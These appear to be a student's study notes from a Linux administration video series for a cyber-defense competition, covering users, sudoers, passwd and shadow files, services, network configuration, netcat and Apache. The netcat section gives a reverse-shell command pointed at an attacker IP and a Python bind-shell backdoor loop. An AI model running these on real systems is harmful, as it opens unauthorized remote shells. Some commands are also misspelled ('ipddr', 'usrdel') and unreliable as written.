## 10: Creating user accounts

### What does the "useradd" command actually do?

e.g. Adding a new user, "bob", with `useradd`:

1. It makes a new **group** called bob
2. It makes a new **user** called bob
3. It creates its home directory at `/home/bob`
4. It copies some standard files for new users from `/etc/skel`, which include stuff like .bashrc (shell config)
5. It prompts a password (with the `passwd` command)
6. It prompts for stuff like full name, "room number", etc. (this gets stored in the /etc/passwd file, but no one really bothers with it)

- Note that, by default, a new user does not have the authority to execute commands as sudo (see vid 13 for more on this)





## 11: Exploring sudoers and removing users

### "ls -l"

- This `ls` option will list the permissions of a file. Should normally pair this with the `-a` option to show hidden files as well (files with a . at the start of their name)

Example of an `ls -la` entry that I ran in my home directory:
`-rwxr-xr-x  br br    126 KB Wed Dec 15 10:28:22 2021 my_sick_program.o*`
    - Note the first 10 characters of this command (`.rwxr-xr-x`)
    - The first `-` indicates that this listing is _not_ a directory (it would show `d` otherwise)
    - The next three characters (`rwx`) indicate that it is readable, writeable, and executable by the file owner -- `br` (my user)
    - The three characters after (`r-x`) indicate that it is readable, _not_ writeable, and executable by the group associated with the file
    - The last three characters (`r-x`) indicate the same thing as before, but these apply to "everyone else" (that is not the owner or group for the file)

- You can modify permissions with `chmod`, e.g. `chmod +x my_sick_program.o`

- Pop quiz: What does it mean if I do `chmod 777 my_sick_program.o`


### `lsattr`

- This lists the "extended" permissions of a file. This can be useful if you can't modify/delete a file even though it seems like you should be able to (chattr +i)
    - [Read more here](https://wiki.archlinux.org/title/File_permissions_and_attributes#File_attributes)





## 12: Exploring sudoers and removing users

### /etc/:

- "Like the control panel for Linux" (Control center for Mac)


### /etc/sudoers

- This file is mega important
    - If you are root user, or can act as root (with sudo), or are in the root group, then you can read this file (`-r--r-----`)

- The `visudo` command:
    - Use this. Don't `sudo vim` or `sudo nano` the sudoers file.

Example: `%admin ALL=(ALL) NOPASSWD: ALL`
- "Users in the admin group, on any host, may run any command as any user, without a password"
- `%admins` indicates that the following rule will apply to the "admin" **group**. If the `%` was absent, then it would refer to a user called "admin"
- The first `ALL` refers to "all hosts"
- The second `(ALL)` refers to the target users
- The third and final `ALL` refers to "all commands"

### userdel

`sudo usrdel -r <user>` to both remove a user and delete their home directory





## 13: Groups

### groups and id commands

- `groups` and `id` both show you what groups you belong to, but `id` shows you the associated user and group IDs as well
    - Pay attention to what users and IDs get listed on your machine, for example, that may have been created by default.


### usermod command

Example: `sudo usermod -a -G sudo bob`
- Adds the user `bob` to the existing group, `sudo`
- `-a` indicates that we're "appending" aka not creating a brand new group
- `-G` indicates the group name that we're appending to


### /etc/group

- Basically /etc/passwd but for groups (more info about /etc/passwd in vid 13)
    - Most of the ones on here will have been pre-made by your Linux ditribution for stuff like services

- Worth paying attention to this file in competitions
    - What groups have been created?
    - What users have been sneakily added to certain groups such as sudo?





## 14: Passwords and shadow hashes


### /etc/passwd: User accounts

Example: `bob:x:1001:1001:,,,:/home/bob:/bin/bash`
- First value is just the username (bob)
- Second value (`x`) indicates that the user has a password, and its hash is stored in `/etc/shadow` -- if you remove this x, the user is set to have no password
- Third and fourth value (`1001`) indicate the associated user ID (uid) and group ID (gid)
- Fifth value (`,,,`) stores the full name, room number, etc. that you typically get prompted for when you run `useradd`
- Sixth value: User's home directory
- Seventh value (`/bin/bash`): The command/shell associated with the user. Should be `/sbin/nologin` for accounts that should not be logged in with (e.g. service accounts, or the `nobody` user)


## /etc/shadow: User password hashes

Example: `vivek:$1$fnfffc$pGteyHdicpGOfffXX4ow#5:13064:0:99999:7:::`
- 1: Username
- 2: Password hash
    - The format for this hash is `$hash_type$salt$hashed_password`
    - `$1$` for the hash type indicates that it is an MD5 hash (deprecated, insecure)
    - `$6$` for the hash type indicates that SHA-512 is being used
    - Try this: in python, `import crypt`, then `crypt.crypt("password", "$1$fnfffc$")`
- 3: Last password change (in UNIX time)
- 4: Minimum number of days required between password changes
- 5: Maximum: Max days that the password is valid (forced to change after that)
- 6: Inactive: Number of days after password expires that account is disabled
- 7: Expire: Expiration date of password, expressed as days since Jan 1, 1970

Remember that empty values look like `::` -- e.g., if the second field has no value, then that means the user has no password.





## 16: Services

If you don't know what a service is (in terms of networking), pls watch the vid cause I won't recap that here.

Some things to think about in regard to services you find in competition:
    - What is its purpose?
    - Does it have a config file? Where?
    - What is its version / vulnerabilities?
    - Is it necessary? ***If not, get rid of it!*** (we've learned this the hard way previously)

- Restarting services:
    - **Do it after editing the settings/config for the service!!!**
    - e.g. `sudo systemctl restart <service_name>` or `sudo service <service_name> restart`
    - Is the server running? i.e. `sudo systemctl status <service_name>` or `sudo service <service_name> status`





## 17: Exploring network configuration

When we're talking about networking and network configuration, **this is where things start to deviate from Linux ditro to Linux distro**.

e.g. In Debian systems, you may use the `/etc/network/interfaces` file to configure networking, while on Arch Linux you may be making files in `/etc/systemd/networkd/`


- `ifconfig`
    - The deprecated (outdated) Linux command for looking at network information
    - Use the `ip` command instead

- `ip`
    - Most common usage: `ip a` (lists out all network adapters/interfaces along with their associated IPs, MAC addresses, etc. e.g if you have a wifi card, it'll be listed here... hopefully)
    - Note the NAME of your interface... Usually, it'll be `eth0`, or something along the lines of `wl...`. Get the name right when you're modifying your network configs!
    - Loopback interface: What is it used for?





## 18: Static network config in Debian / Kali

In these Debian-based distros, for command-line network config, we're interested in the `/etc/network/interfaces` file.

Example from Kali-External VM on NCAE MiniHack sandbox:
```
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 172.20.0.2
    netmask 255.255.0.0
```

Another example (from my cloud server on linode.com) -- note how this one has slightly more info:
```
auto lo
iface lo inet loopback

source /etc/network/interfaces.d/*

auto eth0

iface eth0 inet6 auto
iface eth0 inet static
    address 194.195.212.122/24
    gateway 194.195.212.1
    up  ip addr add 192.167.227.110/17 dev eth0 label eth0:1
    down  ip addr add 192.167.227.110/17 dev eth0 label eth0:1
```

If we needed to use a DHCP server (i.e. auto-assign IPs):
```
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 dhcp
```

- Pop quiz: what is a netmask?

- Review the MiniHacks network diagram that they are requiring of us
    - Remember, the challenges are accessed through [https://ui.sandbox.ncaecybergames.org/challenges](https://ui.sandbox.ncaecybergames.org/challenges)

**Applying our network config changes**
- What is the command that you always need to apply changes of a config?
    - FYI: The network service in Debian machines is typically called `networking`





## 19: Static network config in CentOS / RedHat Enterprise Linux (RHEL)

CentOS machines do not have a `/etc/network/interfaces` file (they use a different networking service!)

- Instead, the relevant network config directory is `/etc/sysconfig/network-scripts/`
    - There is 1 file per interface, e.g. `ifcfg-eth0` and so on...

- In the MiniHack challenge, they require you to use both interfaces on the machine (eth0 and eth1)
    - Edit the corresponding files

- No nano in CentOS!!!

Example: `/etc/sysconfig/network-scripts/ifcfg-eth0` in MiniHack CentOS (**the router**):
```
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no
BOOTPROTO=dhcp
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_FAILURE_FATAL=no
IPV6_ADDR_GEN_MODE=stable-privacy
NAME=eth0
UUID=ad3643ab-6dac-afa2-e422cc7c0748
DEVICE=eth0
ONBOOT=no
```

- Even though the CentOS machine does not yet have an IP, its config file for eth0 still exists

### Changes made for MiniHack:
- edit `BOOTPROTO=static`
- edit `ONBOOT=yes`
- add `IPADDR=<IP>`
- add `NETMASK=<netmask>`


**Applying our network config changes**
- What is the command that you always need to apply changes of a config?
    - FYI: The network service in CentOS/RHEL is just `network`





## 20: Static network config in Ubuntu

Note that Ubuntu still has a `/etc/network/interfaces` file, but it is not used.

- Newer versions of Ubuntu use "Netplan" (in the `/etc/netplan/` directory) for network config
    - Inside that directory there will typically be "YAML" file(s) containing the network specifications

Example: `/etc/netplan/01-network-manager-all.yaml` in MiniHack Ubuntu (**the web server**):
```
network:
    version: 2
    renderer: Networkmanager
```

Example: `/etc/netplan/01-network-manager-all.yaml` from my Linode Ubuntu instance:
```
network:
    version: 2
    renderer: networkd
    ethernets:
        eth0:
            dhcp4: yes
```

### Changes made for MiniHack
```
...
    ethernets:
        eth0:
            addresses:
                - 192.168.<team_num>.2/24
```

**Applying our network config changes**
- This time around, even though we use netplan `sudo systemctl restart netplan` doesn't seem to work
    - Why? Explore how we could make it work
    - Instead, use: `sudo netplan apply`





## 22: Temporary IPs, permanent IPs, and flushing IPs

### Temporary IPs with ip a

Adding a temporary IP with `ip a`:
`sudo ip a add 192.168.118.3/24 dev eth0`

- Note that the above IP is temporary, and thus gets wiped after a restart
    - This is why we learn network configs

- Note on having 2 IPs on one interface: `ifconfig` will not detect both IPs, but `ip a` will


### Flushing the network config (i.e. the IPs assigned to a network interface)

`sudo ipddr flush dev ens18`

- The above does not destroy your network config.





## 23: Netcat (nc)

[Watch the video](https://www.youtube.com/watch?v=_aIac8hweAg&list=PLqux0fXsj7x3WYm6ZWuJnGC1rXQZ1018M&index=23) if you are unfamiliar with what netcat actually is.

### Nc vs. netcat vs. ncat

There can be some well-justified confusion here.
- For our purposes "nc" and "netcat" refer to the same binary.
- "ncat", on the other hand, is the more feature-rich version of nc, created by the Nmap team.


### Abusing netcat 🙀

Netcat doesn't just allow you to send text back and forth between two hosts, you can __redirect the data that it receives to an application on the computer, e.g. /bin/bash__

Example - Ncat reverse shell:
(On compromised victim machine): `nc <attacker_ip> 54321 -e /bin/bash`
(On attacker machine): nc `nc -lvnp 54321`

After the above, the attacker should now have a shell (terminal access) on a vicitm computer (if the above command doesn't work, it may be because you are using a primitive verison of netcat such as nc, instead of ncat).


### Creating a (crappy) persistent backdoor with Python

```
import os
while True:
    os.system("nc -l -p 54321 -e /bin/bash");'
```

* video says ctrl+Z "quits" the python while loop instead of backgrounding it?

can anyone figure out how to one-line this?
    - this does't work:`python -c 'import os; while True: os.system("nc -l -p 54321 -e /bin/bash");'`





## 24: Web services with Apache

* Apache
    - A free and open source HTTP server that's been around for ages

* A good place to start looking for files or configs for services: `/etc/`
    - For apache, the web server port and root directory are located in `/etc/apache2/sites-available/000-default.conf`
    - Sometimes the root of the web server will be `/var/www`, other times `/var/www/html`

* How to start the server? `systemctl` (in Ubuntu), just like we've used before
    - `sudo systemctl enable --now apache2`


## 25: Router configuration and MiniHack completionn

We have the two network interfaces configured... what now? We're still not routing traffic through the router machine to their destination (show diagram)

* In our configuration, remember that the CentOS machine is being designated as a router.
    - Pop quiz: what is a router? What makes it different from a modem?
    - Double pop quiz: what does "modem" mean?

In terms of __routing the network traffic the way we want__, the Linux firewall program "firewalld" will be doing the magic for us.

On CentOS machines:
- Get info about the current firewall setup: `sudo firewall-cmd --list-all-zones
